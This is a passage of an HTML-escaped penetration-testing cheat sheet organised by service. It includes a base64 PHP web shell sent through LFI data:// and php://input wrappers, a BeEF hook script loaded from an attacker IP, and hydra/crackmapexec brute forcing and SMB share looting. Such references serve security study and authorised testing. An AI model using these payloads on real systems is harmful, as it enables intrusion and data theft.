tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ETHREADS\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\ndirbuster\n\nDictionaries :\n   - \u002Fusr\u002Fshare\u002Fwordlists\u002Fdirb\u002Fcommon.txt\n   - \u002Fusr\u002Fshare\u002Fwordlists\u002Fdirb\u002Fbig.txt\n   - \u002Fusr\u002Fshare\u002Fwordlists\u002Fdirbuster\u002Fdirectory-list-2.3-medium.txt\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"file-backups\"\u003EFile backups\u003C\u002Fh4\u003E\n\u003Cp\u003EOnce you have found all the files, look for backups of all the executable files (&quot;\u003Cem\u003E.php\u003C\u002Fem\u003E&quot;, &quot;\u003Cem\u003E.aspx\u003C\u002Fem\u003E&quot;...). Common variations for naming a backup are \u003C\u002Fp\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Efile.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"local-file-inclusion--remote-file-inclusion---lfi--rfi\"\u003ELocal File Inclusion \u002F Remote File Inclusion - LFI \u002F RFI\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttps:\u002F\u002Fgithub.com\u002Fswisskyrepo\u002FPayloadsAllTheThings\u002Ftree\u002Fmaster\u002FFile%20Inclusion\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"wrappers\"\u003EWrappers\u003C\u002Fh4\u003E\n\u003Ch5 id=\"wrapper-phpfilter\"\u003EWrapper php:\u002F\u002Ffilter\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttp:\u002F\u002Fexample.com\u002Findex.php?page=php:\u002F\u002Ffilter\u002Fconvert.base64-encode\u002Fresource=\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch5 id=\"wrapper-expect\"\u003EWrapper expect:\u002F\u002F\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttp:\u002F\u002Fexample.com\u002Findex.php?page=expect:\u002F\u002Fid\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch5 id=\"wrapper-data\"\u003EWrapper data:\u002F\u002F\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Eecho '\u003Cspan class=\"token prolog\"\u003E&lt;?php phpinfo(); ?\u003E\u003C\u002Fspan\u003E' | base64 -w0 -\u003E PD9waHAgcGhwaW5mbygpOyA\u002FPgo=\n\nhttp:\u002F\u002Fexample.com\u002Findex.php?page=data:\u002F\u002Ftext\u002Fplain;base64,PD9waHAgcGhwaW5mbygpOyA\u002FPgo=\n\nIf code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.\n\nCode execution with \n    - exec\n    - shell_exec\n    - system\n    - passthru\n    - popen\n\n# Exemple\necho '\u003Cspan class=\"token prolog\"\u003E&lt;?php passthru($_GET[\"cmd\"]);echo \"Shell done !\"; ?\u003E\u003C\u002Fspan\u003E' | base64 -w0 -\u003E PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA\u002FPgo=\n\nhttp:\u002F\u002Fexample.com\u002Findex.php?page=data:\u002F\u002Ftext\u002Fplain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA\u002FPgo=\n\nIf there is \"Shell done !\" on the webpage, then there is code execution and you can do things like :\n\nhttp:\u002F\u002Fexample.com\u002Findex.php?page=data:\u002F\u002Ftext\u002Fplain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA\u002FPgo=&amp;cmd=ls\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch5 id=\"wrapper-input\"\u003EWrapper input:\u002F\u002F\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ecurl -k -v \"http:\u002F\u002Fexample.com\u002Findex.php?page=php:\u002F\u002Finput\" --data \"\u003Cspan class=\"token prolog\"\u003E&lt;?php echo shell_exec('id'); ?\u003E\u003C\u002Fspan\u003E\"\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"useful-lfi-list\"\u003EUseful LFI list\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Linux\n\u002Fhome\u002Fliodeus\u002Fwordlist\u002FSecLists\u002FFuzzing\u002FLFI\u002FLFI-gracefulsecurity-linux.txt\n\n# Windows\n\u002Fhome\u002Fliodeus\u002Fwordlist\u002FSecLists\u002FFuzzing\u002FLFI\u002FLFI-gracefulsecurity-windows.txt\n\n# Both\n\u002Fhome\u002Fliodeus\u002Fwordlist\u002FSecLists\u002FFuzzing\u002FLFI\u002FLFI-LFISuite-pathtotest-huge.txt\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"tools\"\u003ETools\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ekadimus --url \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\npython lfisuite.py\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"command-injection\"\u003ECommand injection\u003C\u002Fh3\u003E\n\u003Cp\u003EFor command injection always use BurpSuite !\u003C\u002Fp\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttps:\u002F\u002Fgithub.com\u002Fswisskyrepo\u002FPayloadsAllTheThings\u002Ftree\u002Fmaster\u002FCommand%20Injection\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"deserialization\"\u003EDeserialization\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttps:\u002F\u002Fgithub.com\u002Fswisskyrepo\u002FPayloadsAllTheThings\u002Ftree\u002Fmaster\u002FInsecure%20Deserialization\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"file-upload\"\u003EFile upload\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttps:\u002F\u002Fgithub.com\u002Fswisskyrepo\u002FPayloadsAllTheThings\u002Ftree\u002Fmaster\u002FUpload%20Insecure%20Files\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"sql-injection\"\u003ESQL injection\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttps:\u002F\u002Fgithub.com\u002Fswisskyrepo\u002FPayloadsAllTheThings\u002Ftree\u002Fmaster\u002FSQL%20Injection\n\nhttps:\u002F\u002Fcobalt.io\u002Fblog\u002Fa-pentesters-guide-to-sql-injection-sqli\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"xss\"\u003EXSS\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttps:\u002F\u002Fgithub.com\u002Fswisskyrepo\u002FPayloadsAllTheThings\u002Ftree\u002Fmaster\u002FXSS%20Injection\n\nbeef-xss\ncat \u002Fusr\u002Fshare\u002Fbeef-xss\u002Fconfig.yaml | grep user -C 1 # user \u002F password\n\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Escript\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Esrc\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003Ehttp:\u002F\u002F&lt;IP\u003E:3000\u002Fhook.js\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u002F\u003C\u002Fspan\u003Escript\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"other-web-vulnerabilities\"\u003EOther web vulnerabilities\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttps:\u002F\u002Fgithub.com\u002Fswisskyrepo\u002FPayloadsAllTheThings\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"upload-a-file-with-put\"\u003EUpload a file with PUT\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ecurl -X PUT http:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -d @\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E  -v\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"kerberos---88\"\u003EKERBEROS - 88\u003C\u002Fh2\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttps:\u002F\u002Fwww.tarlogic.com\u002Fen\u002Fblog\u002Fhow-to-attack-kerberos\u002F\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"pop3---110\"\u003EPOP3 - 110\u003C\u002Fh2\u003E\n\u003Ch3 id=\"brute-force-3\"\u003EBrute force\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehydra -l \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -P \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E pop3 -V\nhydra -S -v -l \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -P \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -s 995 -f \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E pop3 -V\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"read-mail\"\u003ERead mail\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Etelnet \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E 110\n\nUSER \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nPASS \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nLIST\nRETR \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EMAIL_NUMBER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nQUIT\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"snmp---161\"\u003ESNMP - 161\u003C\u002Fh2\u003E\n\u003Ch3 id=\"brute-force-community-string\"\u003EBrute force community string\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Eonesixtyone -c \u002Fhome\u002Fliodeus\u002Fwordlist\u002FSecLists\u002FDiscovery\u002FSNMP\u002Fcommon-snmp-community-strings-onesixtyone.txt \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Esnmpbulkwalk -c \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ECOMMUNITY_STRING\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -v\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EVERSION\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Esnmp-check \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"modifying-snmp-values\"\u003EModifying SNMP values\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttp:\u002F\u002Fnet-snmp.sourceforge.net\u002Ftutorial\u002Ftutorial-5\u002Fcommands\u002Fsnmpset.html\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"ldap---389\"\u003ELDAP - 389\u003C\u002Fh2\u003E\n\u003Ch3 id=\"scans\"\u003EScans\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Enmap -n -sV --script \"ldap* and not brute\"\n\nldapsearch -h \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -x -s base\nldapsearch -h \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -x -D '\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDOMAIN\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\\\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E' -w '\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E' -b \"DC=&lt;1_SUBDOMAIN\u003E,DC=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ETDL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\"\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"graphical-interface\"\u003EGraphical Interface\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ejxplorer\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"smb---445\"\u003ESMB - 445\u003C\u002Fh2\u003E\n\u003Ch3 id=\"version-if-nmap-didnt-detect-it\"\u003EVersion if nmap didn&#39;t detect it\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003ESometimes nmap doesnt show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445\u002F139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.\n\nOR\n\nsudo ngrep -i -d \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EINTERFACE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E 's.?a.?m.?b.?a.*[[:digit:]]' port 139\nsmbclient -L \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"scan-for-vulnerability\"\u003EScan for vulnerability\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Enmap -p139,445 --script \"smb-vuln-* and not(smb-vuln-regsvc-dos)\" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EIf :\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003EMS17-010 - \u003Ca onclick=\"document.location.hash='EternalBlue';\" href=\"javascript:;\" title=\"MS17-010\"\u003EEternalBlue\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003EMS08-067 - \u003Ca onclick=\"document.location.hash='MS08-067';\" href=\"javascript:;\"\u003EMS08-067\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003ECVE-2017-7494 - \u003Ca onclick=\"document.location.hash='CVE-2017-7494';\" href=\"javascript:;\"\u003ECVE-2017-7494\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch3 id=\"manual-testing\"\u003EManual testing\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Esmbmap -H \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nsmbmap -u '' -p '' -H \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nsmbmap -u 'guest' -p '' -H \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nsmbmap -u '' -p '' -H \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -R\n\ncrackmapexec smb \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\ncrackmapexec smb \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -u '' -p ''\ncrackmapexec smb \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -u 'guest' -p ''\ncrackmapexec smb \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -u '' -p '' --shares\n\nenum4linux -a \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\nsmbclient --no-pass -L \u002F\u002F$IP\nsmbclient \u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESHARE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# Download all files from a directory recursively\nsmbclient \u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESHARE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -U \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -c \"prompt OFF;recurse ON;mget *\"\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"brute-force-4\"\u003EBrute force\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ecrackmapexec smb \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSERS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -p \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nhydra -V -f -L \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSERS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -P \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token 